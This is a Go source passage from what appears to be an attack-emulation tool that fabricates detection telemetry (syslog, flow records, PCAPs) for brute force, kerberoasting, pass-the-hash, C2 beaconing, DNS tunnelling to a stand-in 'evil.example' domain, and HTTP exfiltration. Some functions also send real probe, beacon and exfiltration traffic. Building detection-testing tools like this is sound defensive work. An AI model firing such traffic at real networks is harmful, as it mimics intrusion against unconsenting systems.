			result.EventIDs = append(result.EventIDs, eventID)
		}

		duration := getAttackParamInt(req.Params, "duration", 30)
		rdpPkts := uint32(150 * duration / 30)
		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 3389, Protocol: 6,
			Bytes: rdpPkts * 200, Packets: rdpPkts,
			StartTime: time.Now().Add(-time.Duration(duration) * time.Second), EndTime: time.Now(), TCPFlags: 0x18}}
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP (Option B)
		path, _ := PCAPBruteForce(req.RunID, req.AttackerIP, targetIP, 3389, "rdp", 10, nil)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}

		// Real packets (Option A)
		go sendRealTCPProbe(targetIP, 3389, rdpClientPDU, 5)
	}
	return result, nil
}

func runBruteForceSMB(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	attackerDev := getAttackerDevice()
	for _, targetIP := range req.TargetIPs {
		targetDev, _ := getDeviceByIP(targetIP)
		if targetDev == nil {
			continue
		}
		events := SyslogBruteForce(attackerDev, targetDev, "smb")
		result.SyslogCount += len(events)
		for _, ev := range events {
			eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "TCP", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}

		duration := getAttackParamInt(req.Params, "duration", 30)
		smbPkts := uint32(120 * duration / 30)
		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 445, Protocol: 6,
			Bytes: smbPkts * 208, Packets: smbPkts,
			StartTime: time.Now().Add(-time.Duration(duration) * time.Second), EndTime: time.Now(), TCPFlags: 0x18}}
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP (Option B)
		path, _ := PCAPBruteForce(req.RunID, req.AttackerIP, targetIP, 445, "smb", 10, nil)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}

		// Real packets (Option A)
		go sendRealTCPProbe(targetIP, 445, smbNegotiatePDU, 5)
	}
	return result, nil
}

func runCredentialStuffing(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	listSize := getAttackParamInt(req.Params, "list_size", 100)
	for _, targetIP := range req.TargetIPs {
		targetDev, _ := getDeviceByIP(targetIP)
		if targetDev == nil {
			continue
		}
		var lastUser string
		for idx := 0; idx < min(listSize, 20); idx++ {
			user := fmt.Sprintf("user%d@corp.local", rand.Intn(1000))
			lastUser = user
			msg := fmt.Sprintf("Authentication failed for %s from %s — invalid credentials (credential stuffing suspected)", user, req.AttackerIP)
			ev := sendSyslog(targetDev, msg, 4)
			result.SyslogCount++
			eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "HTTPS", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}

		duration := getAttackParamInt(req.Params, "duration", 10)
		stuffPkts := uint32(min(listSize, 20) * 4 * duration / 10)
		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 443, Protocol: 6,
			Bytes: stuffPkts * 200, Packets: stuffPkts,
			StartTime: time.Now().Add(-time.Duration(duration) * time.Second), EndTime: time.Now(), TCPFlags: 0x18}}
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP: one representative login attempt
		reqPayload := []byte(fmt.Sprintf("POST /login HTTP/1.1\r\nHost: %s\r\nContent-Type: application/x-www-form-urlencoded\r\n\r\nemail=%s&password=leaked123", targetIP, lastUser))
		respPayload := []byte("HTTP/1.1 401 Unauthorized\r\nContent-Length: 0\r\n\r\n")
		path, _ := PCAPGenericTCPExchange(req.RunID, "credential_stuffing", req.AttackerIP, targetIP, 443, reqPayload, respPayload)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}
	}
	return result, nil
}

func runKerberoasting(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	dcIPs := domainControllerIPs()
	for _, dcIP := range dcIPs {
		dcDev, _ := getDeviceByIP(dcIP)
		if dcDev == nil {
			continue
		}
		spns := []string{"MSSQLSvc/db-server:1433", "HTTP/web-server", "CIFS/file-server"}
		for _, spn := range spns {
			msg := fmt.Sprintf("Kerberos TGS-REQ: account %s requested service ticket for SPN %s from %s", req.AttackerIP, spn, req.AttackerIP)
			ev := sendSyslog(dcDev, msg, 4)
			result.SyslogCount++
			eventID, _ := recordRunEvent(req.RunID, "syslog", dcDev.Name, req.AttackerIP, dcIP, "TCP", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}

		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: dcIP, SrcPort: randomPort(), DstPort: 88, Protocol: 17, Bytes: uint32(len(spns) * 600), Packets: uint32(len(spns) * 2), StartTime: time.Now(), EndTime: time.Now().Add(2 * time.Second)}}
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, dcIP, "UDP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP: TGS-REQ/TGS-REP exchange (port 88, Kerberos), text approximation
		reqPayload := []byte(fmt.Sprintf("TGS-REQ: sname=%s realm=CORP.LOCAL", spns[0]))
		respPayload := []byte("TGS-REP: ticket=<RC4-HMAC encrypted blob>")
		path, _ := PCAPGenericTCPExchange(req.RunID, "kerberoasting", req.AttackerIP, dcIP, 88, reqPayload, respPayload)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}
	}
	return result, nil
}

func runPassTheHash(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	for _, targetIP := range req.TargetIPs {
		targetDev, _ := getDeviceByIP(targetIP)
		if targetDev == nil {
			continue
		}
		msg := fmt.Sprintf("NTLM pass-the-hash: authentication with hash from %s to %s — EventID 4624 LogonType 3", req.AttackerIP, targetIP)
		ev := sendSyslog(targetDev, msg, 2)
		result.SyslogCount++
		eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "SMB", ev)
		result.EventIDs = append(result.EventIDs, eventID)

		// PCAP: NTLM auth exchange over SMB (port 445), text approximation
		hash := getAttackParam(req.Params, "hash", "aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0")
		reqPayload := []byte(fmt.Sprintf("NTLMSSP_AUTH: hash=%s", hash))
		respPayload := []byte("SMB2_SESSION_SETUP: STATUS_SUCCESS")
		path, _ := PCAPGenericTCPExchange(req.RunID, "pass_the_hash", req.AttackerIP, targetIP, 445, reqPayload, respPayload)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}

		lateralFlows := FlowLateral(req.AttackerIP, targetIP)
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", lateralFlows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)
	}
	return result, nil
}

// ──────────────────────────────────────────────────────────────────────────────
// C2 / Malware attacks
// ──────────────────────────────────────────────────────────────────────────────

func runC2Beaconing(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	logInfo("Entering runC2Beaconing attacker=%s targets=%v", req.AttackerIP, req.TargetIPs)

	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	intervalSecs := getAttackParamInt(req.Params, "interval_secs", 60)
	count := getAttackParamInt(req.Params, "count", 10)
	c2Dev := getCCServer()

	for _, infectedIP := range req.TargetIPs {
		infectedDev, _ := getDeviceByIP(infectedIP)
		if infectedDev == nil {
			continue
		}

		interval := time.Duration(intervalSecs) * time.Second
		syslogEvents := SyslogBeaconing(infectedDev, c2Dev.IPAddress, 100*time.Millisecond, count)
		result.SyslogCount += len(syslogEvents)
		for _, ev := range syslogEvents {
			eventID, _ := recordRunEvent(req.RunID, "syslog", "fw-perimeter", infectedIP, c2Dev.IPAddress, "HTTPS", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}

		beaconFlows := FlowBeaconing(infectedIP, c2Dev.IPAddress, count, interval)
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", infectedIP, c2Dev.IPAddress, "HTTPS", beaconFlows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP (Option B — always generate)
		_, path, err := PCAPBeaconing(infectedDev, c2Dev.IPAddress, count)
		if err == nil && path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}

		// Real packets (Option A)
		go sendRealBeacon(realC2IP(), realC2Port(), count)
	}
	return result, nil
}

func runDGA(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	count := getAttackParamInt(req.Params, "count", 50)
	dnsDev := getDNSServer()
	if dnsDev == nil {
		return result, nil
	}

	tlds := []string{"com", "net", "org", "info", "biz"}
	var dgaDomains []string
	for _, infectedIP := range req.TargetIPs {
		for idx := 0; idx < count; idx++ {
			domain := fmt.Sprintf("%s.%s", randomHexString(12), tlds[rand.Intn(len(tlds))])
			dgaDomains = append(dgaDomains, domain)
			msg := fmt.Sprintf("client %s#%d: query: %s IN A NXDOMAIN (%s)", infectedIP, randomPort(), domain, dnsDev.IPAddress)
			ev := sendSyslog(dnsDev, msg, 5)
			result.SyslogCount++
			eventID, _ := recordRunEvent(req.RunID, "syslog", dnsDev.Name, infectedIP, dnsDev.IPAddress, "UDP", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}

		if dnsDev != nil {
			flows := []FlowRecord{{SrcIP: infectedIP, DstIP: dnsDev.IPAddress, SrcPort: randomPort(), DstPort: 53, Protocol: 17,
				Bytes: uint32(count * 80), Packets: uint32(count * 2),
				StartTime: time.Now(), EndTime: time.Now().Add(time.Duration(count) * time.Second)}}
			fw := getFirewall()
			fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", infectedIP, dnsDev.IPAddress, "UDP", flows)
			result.FlowCount += fc
			result.EventIDs = append(result.EventIDs, fids...)
		}
		// PCAP: one representative NXDOMAIN lookup
		if len(dgaDomains) > 0 {
			path, _ := PCAPDNSQueryResponse(req.RunID, "dga", infectedIP, dnsDev.IPAddress, dgaDomains[len(dgaDomains)-1], true)
			if path != "" {
				result.PCAPFiles = append(result.PCAPFiles, path)
			}
		}
	}

	// Real packets (Option A — real DNS lookups for DGA domains)
	go sendRealDGALookups(dgaDomains)
	return result, nil
}

func runDNSTunnel(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	domain := getAttackParam(req.Params, "domain", "tunnel.evil.example")
	count := getAttackParamInt(req.Params, "count", 30)
	dnsDev := getDNSServer()

	for _, infectedIP := range req.TargetIPs {
		infectedDev, _ := getDeviceByIP(infectedIP)
		if infectedDev == nil {
			continue
		}
		events := SyslogDNSTunnel(infectedDev, domain, count)
		result.SyslogCount += len(events)
		for _, ev := range events {
			dstIP := ""
			if dnsDev != nil {
				dstIP = dnsDev.IPAddress
			}
			eventID, _ := recordRunEvent(req.RunID, "syslog", "dns-server", infectedIP, dstIP, "UDP", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}
		if dnsDev != nil {
			flows := []FlowRecord{{SrcIP: infectedDev.IPAddress, DstIP: dnsDev.IPAddress, SrcPort: randomPort(), DstPort: 53, Protocol: 17, Bytes: uint32(count * 200), Packets: uint32(count * 2), StartTime: time.Now(), EndTime: time.Now().Add(time.Duration(count) * time.Second)}}
			fw := getFirewall()
			fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", infectedDev.IPAddress, dnsDev.IPAddress, "UDP", flows)
			result.FlowCount += fc
			result.EventIDs = append(result.EventIDs, fids...)
		}

		// PCAP (Option B — always generate)
		if dnsDev != nil {
			_, path, _ := PCAPDNSTunnel(infectedDev, dnsDev, domain, count)
			if path != "" {
				result.PCAPFiles = append(result.PCAPFiles, path)
			}
		}

		// Real packets (Option A — real DNS TXT queries with encoded subdomains)
		if dnsDev != nil {
			go sendRealDNSQuery(dnsDev.IPAddress, domain, count)
		}
	}
	return result, nil
}

func runHTTPCovertChannel(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	count := getAttackParamInt(req.Params, "count", 20)
	c2Dev := getCCServer()
	fw := getFirewall()

	for _, infectedIP := range req.TargetIPs {
		var lastData string
		for idx := 0; idx < count; idx++ {
			encodedData := randomHexString(64)
			lastData = encodedData
			msg := fmt.Sprintf("Outbound HTTP: src=%s dst=%s header X-Custom-Data: %s", infectedIP, c2Dev.IPAddress, encodedData)
			ev := sendSyslog(fw, msg, 6)
			result.SyslogCount++
			eventID, _ := recordRunEvent(req.RunID, "syslog", "fw-perimeter", infectedIP, c2Dev.IPAddress, "HTTP", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}

		flows := []FlowRecord{{SrcIP: infectedIP, DstIP: c2Dev.IPAddress, SrcPort: randomPort(), DstPort: 80, Protocol: 6, Bytes: uint32(count * 300), Packets: uint32(count * 4), StartTime: time.Now(), EndTime: time.Now().Add(time.Duration(count) * time.Second), TCPFlags: 0x18}}
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", infectedIP, c2Dev.IPAddress, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP
		reqPayload := []byte(fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nX-Custom-Data: %s\r\n\r\n", c2Dev.IPAddress, lastData))
		respPayload := []byte("HTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n")
		path, _ := PCAPGenericTCPExchange(req.RunID, "http_covert", infectedIP, c2Dev.IPAddress, 80, reqPayload, respPayload)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}

		// Real packets (Option A — HTTP with covert headers)
		go sendRealHTTPCovert(realC2IP(), realC2Port(), count)
	}
	return result, nil
}

// ──────────────────────────────────────────────────────────────────────────────
// Lateral movement / Exfiltration
// ──────────────────────────────────────────────────────────────────────────────

func runLateralSMB(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	sourceDev, _ := getDeviceByIP(req.AttackerIP)
	if sourceDev == nil {
		sourceDev = getAttackerDevice()
	}
	for _, targetIP := range req.TargetIPs {
		targetDev, _ := getDeviceByIP(targetIP)
		if targetDev == nil {
			continue
		}
		events := SyslogLateralMovement(sourceDev, targetDev)
		result.SyslogCount += len(events)
		for _, ev := range events {
			eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "SMB", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}
		flows := FlowLateral(req.AttackerIP, targetIP)
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP (Option B)
		path, _ := PCAPLateral(req.RunID, req.AttackerIP, targetIP, 445)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}

		// Real packets (Option A)
		go sendRealTCPProbe(targetIP, 445, smbNegotiatePDU, 1)
	}
	return result, nil
}

func runPsExec(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	for _, targetIP := range req.TargetIPs {
		targetDev, _ := getDeviceByIP(targetIP)
		if targetDev == nil {
			continue
		}
		msgs := []string{
			fmt.Sprintf("Service PSEXESVC created by %s on %s", req.AttackerIP, targetIP),
			fmt.Sprintf("Process cmd.exe started by PSEXESVC from %s — PID %d", req.AttackerIP, 4000+rand.Intn(1000)),
		}
		for _, msg := range msgs {
			ev := sendSyslog(targetDev, msg, 2)
			result.SyslogCount++
			eventID, _ := recordRunEvent(req.RunID, "syslog", targetDev.Name, req.AttackerIP, targetIP, "SMB", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}
		flows := []FlowRecord{{SrcIP: req.AttackerIP, DstIP: targetIP, SrcPort: randomPort(), DstPort: 445, Protocol: 6, Bytes: 8000, Packets: 20, StartTime: time.Now(), EndTime: time.Now().Add(3 * time.Second), TCPFlags: 0x18}}
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", req.AttackerIP, targetIP, "TCP", flows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP: SMB service creation request/response, text approximation
		reqPayload := []byte(fmt.Sprintf("SVCCTL_CreateServiceW: name=PSEXESVC binPath=%%SystemRoot%%\\PSEXESVC.exe"))
		respPayload := []byte("SVCCTL_CreateServiceW_RESP: STATUS_SUCCESS")
		path, _ := PCAPGenericTCPExchange(req.RunID, "psexec", req.AttackerIP, targetIP, 445, reqPayload, respPayload)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}
	}
	return result, nil
}

func runExfilHTTP(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	dataMB := getAttackParamInt(req.Params, "data_mb", 100)
	c2Dev := getCCServer()
	if c2Dev == nil {
		return result, nil
	}

	for _, sourceIP := range req.TargetIPs {
		sourceDev, _ := getDeviceByIP(sourceIP)
		events := SyslogDataExfil(sourceDev, c2Dev.IPAddress)
		result.SyslogCount += len(events)
		for _, ev := range events {
			eventID, _ := recordRunEvent(req.RunID, "syslog", "fw-perimeter", sourceIP, c2Dev.IPAddress, "HTTPS", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}

		exfilFlows := FlowExfil(sourceIP, c2Dev.IPAddress, uint32(dataMB*1024*1024))
		fw := getFirewall()
		fc, fids := exportFlowsAllFormats(req.RunID, fw, "fw-perimeter", sourceIP, c2Dev.IPAddress, "HTTPS", exfilFlows)
		result.FlowCount += fc
		result.EventIDs = append(result.EventIDs, fids...)

		// PCAP (Option B)
		path, _ := PCAPExfil(req.RunID, sourceIP, c2Dev.IPAddress, 443, dataMB)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}

		// Real packets (Option A — real HTTP POST with large body)
		go sendRealHTTPExfil(realC2IP(), realC2Port(), dataMB)
	}
	return result, nil
}

// ──────────────────────────────────────────────────────────────────────────────
// Wireless / Infrastructure
// ──────────────────────────────────────────────────────────────────────────────

func runRogueAP(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	logInfo("Entering runRogueAP attacker=%s", req.AttackerIP)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	ssid := getAttackParam(req.Params, "ssid", "Corp-WiFi")

	rogueMAC := [6]byte{0x00, 0xaa, 0xbb, 0xcc, 0xdd, 0xff}
	for _, apDev := range getWirelessAPs() {
		msg := fmt.Sprintf("Rogue AP detected: SSID '%s' MAC 00:aa:bb:cc:dd:ff RSSI -65dBm on channel 6 — evil twin suspected", ssid)
		ev := sendSyslog(apDev, msg, 2)
		result.SyslogCount++
		eventID, _ := recordRunEvent(req.RunID, "syslog", apDev.Name, req.AttackerIP, apDev.IPAddress, "802.11", ev)
		result.EventIDs = append(result.EventIDs, eventID)

		// PCAP: rogue AP's beacon frame advertising the spoofed SSID
		path, _ := PCAP80211Beacon(req.RunID, "rogue_ap_beacon", rogueMAC, ssid)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}
	}
	logInfo("Return from runRogueAP syslogs=%d", result.SyslogCount)
	return result, nil
}

func runDeauth(req AttackRequest) (*AttackResult, error) {
	defer panicHandler(traceFunc(), nil)
	logInfo("Entering runDeauth attacker=%s", req.AttackerIP)
	result := &AttackResult{AttackID: req.AttackID, RunID: req.RunID, AttackerIP: req.AttackerIP, TargetIPs: req.TargetIPs, StartedAt: time.Now()}
	apName := getAttackParam(req.Params, "ap_name", "ap-floor1")

	for _, apDev := range getWirelessAPs() {
		if apDev.Name != apName && apName != "" {
			continue
		}
		apMAC := parseMACAddress(apDev.MACAddress)
		for idx := 0; idx < 10; idx++ {
			clientMACStr := fmt.Sprintf("aa:bb:cc:%02x:%02x:%02x", rand.Intn(256), rand.Intn(256), rand.Intn(256))
			msg := fmt.Sprintf("Deauthentication flood: %d deauth frames from %s targeting client %s — denial of service",
				100+rand.Intn(400), req.AttackerIP, clientMACStr)
			ev := sendSyslog(apDev, msg, 2)
			result.SyslogCount++
			eventID, _ := recordRunEvent(req.RunID, "syslog", apDev.Name, req.AttackerIP, apDev.IPAddress, "802.11", ev)
			result.EventIDs = append(result.EventIDs, eventID)
		}

		// PCAP: deauth frames targeting one synthesized client
		clientMAC := parseMACAddress(fmt.Sprintf("aa:bb:cc:%02x:%02x:%02x", rand.Intn(256), rand.Intn(256), rand.Intn(256)))
		path, _ := PCAP80211Deauth(req.RunID, "deauth_flood", apMAC, clientMAC, 10)
		if path != "" {
			result.PCAPFiles = append(result.PCAPFiles, path)
		}
		break
	}
	logInfo("Return from runDeauth syslogs=%d", result.SyslogCount)
	return result, nil
}
